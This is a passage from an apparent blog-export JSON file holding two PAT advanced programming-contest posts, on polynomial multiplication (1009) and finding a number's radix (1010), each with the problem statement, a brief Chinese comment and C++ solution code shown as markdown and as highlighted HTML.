PAT\ncategories: []\ndate: 2017-02-09 22:20:20\n---\n\n## Description\n\n> 1009.Product of Polynomials (25)\n\n> Input Specification:\n\n> Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 ... NK aNK, where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1, 2, ..., K) are the exponents and coefficients, respectively. It is given that 1 <= K <= 10, 0 <= NK < ... < N2 < N1 <=1000.\n\n> Output Specification:\n\n> For each test case you should output the product of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate up to 1 decimal place.\n\n> Sample Input\n2 1 2.4 0 3.2\n2 2 1.5 1 0.5\n\n> Sample Output\n3 3 3.6 2 6.0 1 1.6\n\n居然一次过了。\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\nusing namespace std;\ntypedef long long LL;\n\nconst int maxN = 1e3 + 10;\nfloat ans[maxN + maxN];\nfloat p1[maxN];\nfloat p2[maxN];\nint k1, k2, k3;\n\nint main()\n{\n\tcin >> k1;\n\twhile (k1--)\n\t{\n\t\tint x; cin >> x; cin >> p1[x];\n\t}\n\tcin >> k2;\n\twhile (k2--)\n\t{\n\t\tint x; cin >> x; cin >> p2[x];\n\t}\n\tfor (int i = 0; i < maxN; i++)\n\t{\n\t\tif (p2[i])\n\t\t\tfor (int j = 0; j < maxN; j++)\n\t\t\t{\n\t\t\t\tif (p1[j])\n\t\t\t\t\tans[i + j] += p1[j] * p2[i];\n\t\t\t}\n\t}\n\tfor (int i = 0; i < 2 * maxN; i++)\n\t\tif (ans[i])\n\t\t\tk3++;\n\tcout << k3;\n\tfor (int i = 2 * maxN - 1; i >= 0; i--)\n\t{\n\t\tif (ans[i])\n\t\t\tprintf(\" %d %.1f\", i, ans[i]);\n\t}\n\treturn 0;\n}\n```","slug":"PAT-advanced-1009","published":1,"updated":"2017-02-09T14:31:15.976Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jzv001zhv18w7oans5p","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1009.Product of Polynomials (25)</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 … NK aNK, where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1, 2, …, K) are the exponents and coefficients, respectively. It is given that 1 &lt;= K &lt;= 10, 0 &lt;= NK &lt; … &lt; N2 &lt; N1 &lt;=1000.</p>\n<p>Output Specification:</p>\n<p>For each test case you should output the product of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate up to 1 decimal place.</p>\n<p>Sample Input<br>2 1 2.4 0 3.2<br>2 2 1.5 1 0.5</p>\n<p>Sample Output<br>3 3 3.6 2 6.0 1 1.6</p>\n</blockquote>\n<p>居然一次过了。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;climits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e3</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">float</span> ans[maxN + maxN];</div><div class=\"line\"><span class=\"keyword\">float</span> p1[maxN];</div><div class=\"line\"><span class=\"keyword\">float</span> p2[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> k1, k2, k3;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; k1;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (k1--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> x; <span class=\"built_in\">cin</span> &gt;&gt; x; <span class=\"built_in\">cin</span> &gt;&gt; p1[x];</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; k2;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (k2--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> x; <span class=\"built_in\">cin</span> &gt;&gt; x; <span class=\"built_in\">cin</span> &gt;&gt; p2[x];</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; maxN; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (p2[i])</div><div class=\"line\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; maxN; j++)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (p1[j])</div><div class=\"line\">\t\t\t\t\tans[i + j] += p1[j] * p2[i];</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">2</span> * maxN; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (ans[i])</div><div class=\"line\">\t\t\tk3++;</div><div class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; k3;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">2</span> * maxN - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">0</span>; i--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (ans[i])</div><div class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" %d %.1f\"</span>, i, ans[i]);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1009.Product of Polynomials (25)</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case occupies 2 lines, and each line contains the information of a polynomial: K N1 aN1 N2 aN2 … NK aNK, where K is the number of nonzero terms in the polynomial, Ni and aNi (i=1, 2, …, K) are the exponents and coefficients, respectively. It is given that 1 &lt;= K &lt;= 10, 0 &lt;= NK &lt; … &lt; N2 &lt; N1 &lt;=1000.</p>\n<p>Output Specification:</p>\n<p>For each test case you should output the product of A and B in one line, with the same format as the input. Notice that there must be NO extra space at the end of each line. Please be accurate up to 1 decimal place.</p>\n<p>Sample Input<br>2 1 2.4 0 3.2<br>2 2 1.5 1 0.5</p>\n<p>Sample Output<br>3 3 3.6 2 6.0 1 1.6</p>\n</blockquote>\n<p>居然一次过了。</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;climits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> LL;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxN = <span class=\"number\">1e3</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"keyword\">float</span> ans[maxN + maxN];</div><div class=\"line\"><span class=\"keyword\">float</span> p1[maxN];</div><div class=\"line\"><span class=\"keyword\">float</span> p2[maxN];</div><div class=\"line\"><span class=\"keyword\">int</span> k1, k2, k3;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; k1;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (k1--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> x; <span class=\"built_in\">cin</span> &gt;&gt; x; <span class=\"built_in\">cin</span> &gt;&gt; p1[x];</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; k2;</div><div class=\"line\">\t<span class=\"keyword\">while</span> (k2--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> x; <span class=\"built_in\">cin</span> &gt;&gt; x; <span class=\"built_in\">cin</span> &gt;&gt; p2[x];</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; maxN; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (p2[i])</div><div class=\"line\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; maxN; j++)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (p1[j])</div><div class=\"line\">\t\t\t\t\tans[i + j] += p1[j] * p2[i];</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">2</span> * maxN; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (ans[i])</div><div class=\"line\">\t\t\tk3++;</div><div class=\"line\">\t<span class=\"built_in\">cout</span> &lt;&lt; k3;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">2</span> * maxN - <span class=\"number\">1</span>; i &gt;= <span class=\"number\">0</span>; i--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (ans[i])</div><div class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\" %d %.1f\"</span>, i, ans[i]);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1010","date":"2017-02-13T04:32:46.000Z","_content":"\n## Description\n\n> 1010.Radix (25)\n\n> Given a pair of positive integers, for example, 6 and 110, can this equation 6 = 110 be true? The answer is \"yes\", if 6 is a decimal number and 110 is a binary number.\n\n> Now for any pair of positive integers N1 and N2, your task is to find the radix of one number while that of the other is given.\n\n> Input Specification:\n\n> Each input file contains one test case. Each case occupies a line which contains 4 positive integers:\nN1 N2 tag radix\nHere N1 and N2 each has no more than 10 digits. A digit is less than its radix and is chosen from the set {0-9, a-z} where 0-9 represent the decimal numbers 0-9, and a-z represent the decimal numbers 10-35. The last number \"radix\" is the radix of N1 if \"tag\" is 1, or of N2 if \"tag\" is 2.\n\n> Output Specification:\n\n> For each test case, print in one line the radix of the other number so that the equation N1 = N2 is true. If the equation is impossible, print \"Impossible\". If the solution is not unique, output the smallest possible radix.\n\n> Sample Input 1:\n6 110 1 10\nSample Output 1:\n2\n\n>Sample Input 2:\n1 ab 1 2\nSample Output 2:\nImpossible\n\n自己写的超时了，后来改了下又没全过，找不到问题郁闷极了。。借鉴了别人的\n\n## Code\n\n```\n#include <cstdio>\n#include <cmath>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\nusing namespace std;\ntypedef unsigned long long uLL;\nconst int maxn = 1e5 + 10;\nstring a, b;\nint tag, radix, res;\nuLL ans = 0, l, r;\n\nuLL get(char ch)\n{\n\tif ('0' <= ch&&ch <= '9') return ch - '0';\n\treturn ch - 'a' + 10;\n}\n\nint main()\n{\n\tcin >> a >> b >> tag >> radix;\n\tif (tag == 2) swap(a, b);\n\tfor (int i = 0; a[i]; i++) ans = ans*radix + get(a[i]);\n\tfor (int i = 0; b[i]; i++) l = max(l, get(b[i]));\n\tfor (l++, r = ans + 1; l <= r;)\n\t{\n\t\tuLL mid = l + r >> 1;\n\t\tuLL check = 0;\n\t\tfor (int i = 0; b[i]; i++) check = check*mid + get(b[i]);\n\t\tif (check == ans) res = mid;\n\t\tif (check >= ans) r = mid - 1; else l = mid + 1;\n\t}\n\tres ? printf(\"%d\\n\", res) : printf(\"Impossible\\n\");\n\treturn 0;\n}\n```","source":"_posts/PAT-advanced-1010.md","raw":"---\ntitle: PAT advanced 1010\ntags:\n  - PAT\ncategories: []\ndate: 2017-02-13 12:32:46\n---\n\n## Description\n\n> 1010.Radix (25)\n\n> Given a pair of positive integers, for example, 6 and 110, can this equation 6 = 110 be true? The answer is \"yes\", if 6 is a decimal number and 110 is a binary number.\n\n> Now for any pair of positive integers N1 and N2, your task is to find the radix of one number while that of the other is given.\n\n> Input Specification:\n\n> Each input file contains one test case. Each case occupies a line which contains 4 positive integers:\nN1 N2 tag radix\nHere N1 and N2 each has no more than 10 digits. A digit is less than its radix and is chosen from the set {0-9, a-z} where 0-9 represent the decimal numbers 0-9, and a-z represent the decimal numbers 10-35. The last number \"radix\" is the radix of N1 if \"tag\" is 1, or of N2 if \"tag\" is 2.\n\n> Output Specification:\n\n> For each test case, print in one line the radix of the other number so that the equation N1 = N2 is true. If the equation is impossible, print \"Impossible\". If the solution is not unique, output the smallest possible radix.\n\n> Sample Input 1:\n6 110 1 10\nSample Output 1:\n2\n\n>Sample Input 2:\n1 ab 1 2\nSample Output 2:\nImpossible\n\n自己写的超时了，后来改了下又没全过，找不到问题郁闷极了。。借鉴了别人的\n\n## Code\n\n```\n#include <cstdio>\n#include <cmath>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include <algorithm>\n#include <climits>\n\nusing namespace std;\ntypedef unsigned long long uLL;\nconst int maxn = 1e5 + 10;\nstring a, b;\nint tag, radix, res;\nuLL ans = 0, l, r;\n\nuLL get(char ch)\n{\n\tif ('0' <= ch&&ch <= '9') return ch - '0';\n\treturn ch - 'a' + 10;\n}\n\nint main()\n{\n\tcin >> a >> b >> tag >> radix;\n\tif (tag == 2) swap(a, b);\n\tfor (int i = 0; a[i]; i++) ans = ans*radix + get(a[i]);\n\tfor (int i = 0; b[i]; i++) l = max(l, get(b[i]));\n\tfor (l++, r = ans + 1; l <= r;)\n\t{\n\t\tuLL mid = l + r >> 1;\n\t\tuLL check = 0;\n\t\tfor (int i = 0; b[i]; i++) check = check*mid + get(b[i]);\n\t\tif (check == ans) res = mid;\n\t\tif (check >= ans) r = mid - 1; else l = mid + 1;\n\t}\n\tres ? printf(\"%d\\n\", res) : printf(\"Impossible\\n\");\n\treturn 0;\n}\n```","slug":"PAT-advanced-1010","published":1,"updated":"2017-02-13T04:35:38.448Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0jzw0021hv18vymntrgn","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1010.Radix (25)</p>\n<p>Given a pair of positive integers, for example, 6 and 110, can this equation 6 = 110 be true? The answer is “yes”, if 6 is a decimal number and 110 is a binary number.</p>\n<p>Now for any pair of positive integers N1 and N2, your task is to find the radix of one number while that of the other is given.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case occupies a line which contains 4 positive integers:<br>N1 N2 tag radix<br>Here N1 and N2 each has no more than 10 digits. A digit is less than its radix and is chosen from the set {0-9, a-z} where 0-9 represent the decimal numbers 0-9, and a-z represent the decimal numbers 10-35. The last number “radix” is the radix of N1 if “tag” is 1, or of N2 if “tag” is 2.</p>\n<p>Output Specification:</p>\n<p>For each test case, print in one line the radix of the other number so that the equation N1 = N2 is true. If the equation is impossible, print “Impossible”. If the solution is not unique, output the smallest possible radix.</p>\n<p>Sample Input 1:<br>6 110 1 10<br>Sample Output 1:<br>2</p>\n<p>Sample Input 2:<br>1 ab 1 2<br>Sample Output 2:<br>Impossible</p>\n</blockquote>\n<p>自己写的超时了，后来改了下又没全过，找不到问题郁闷极了。。借鉴了别人的</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;climits&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span> <span class=\"keyword\">long</span> uLL;</div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxn = <span class=\"number\">1e5</span> + <span class=\"number\">10</span>;</div><div class=\"line\"><span class=\"built_in\">string</span> a, b;</div><div class=\"line\"><span class=\"keyword\">int</span> tag, radix, res;</div><div class=\"line\">uLL ans = <span class=\"number\">0</span>, l, r;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">uLL <span class=\"title\">get</span><span class=\"params\">(<span class=\"keyword\">char</span> ch)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"string\">'0'</span> &lt;= ch&amp;&amp;ch &lt;= <span class=\"string\">'9'</span>) <span class=\"keyword\">return</span> ch - <span class=\"string\">'0'</span>;</div><div class=\"line\">\t<span class=\"keyword\">return</span> ch - <span class=\"string\">'a'</span> + <span class=\"number\">10</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">cin</span> &gt;&gt; a &gt;&gt; b &gt;&gt; tag &gt;&gt; radix;</div><div class=\"line\">\t<span class=\"keyword\">if</span> (tag == <span class=\"number\">2</span>) swap(a, b);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; a[i]; i++) ans = ans*radix + get(a[i]);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; b[i]; i++) l = max(l, get(b[i]));</div><div class=\"line\">\t<span class=\"keyword\">for</span> (l++, r = ans + <span class=\"number\">1</span>; l &lt;= r;)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tuLL mid = l + r &gt;&gt; <span class=\"number\">1</span>;</div><div class=\"line\">\t\tuLL check = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; b[i]; i++) check = check*mid + get(b[i]);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (check == ans) res = mid;</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (check &gt;= ans) r = mid - <span class=\"number\">1</span>; <span class=\"keyword\">else</span> l = mid + <span class=\"number\">1</span>;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\tres ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\\n\"</span>, res) : <span class=\"built_in\">printf</span>(<span class=\"string\">\"Impossible\\n\"</span>);</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p>1010.Radix (25)</p>\n<p>Given a pair of positive integers, for example, 6 and 110, can this equation 6 = 110 be true? The answer is “yes”, if 6 is a decimal number and 110 is a binary number.</p>\n<p>Now for any pair of positive integers N1 and N2, your task is to find the radix of one number while that of the other is given.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. Each case occupies a line which contains 4 positive integers:<br>N1 N2 tag radix<br>Here N1 and N2 each has no more than 10 digits. A digit is less than its radix and is chosen from the set {0-9, a-z} where 0-9 represent the decimal numbers 0-9, and a-z represent the decimal numbers 10-35. The last number “radix” is the radix of N1 if “tag” is 1, or of N2 if “tag” is 2.</p>\n<p>Output Specification:</p>\n<p>For each test case, print in one line the radix of the other number so that the equation N1 = N2 is true. If the equation is impossible, print “Impossible”. If the solution is not unique, output the smallest possible radix.</p>\n<p>Sample Input 1:<br>6 110 1 10<br>Sample Output 1:<br>2</p>\n<p>Sample Input 2:<br>1 ab 1 2<br>Sample Output 2:<br>Impossible</p>\n</blockquote>\n<p>自己写的超时了，后来改了下又没全过，找不到问题郁闷极了。。借鉴了别人的</p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cmath&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span 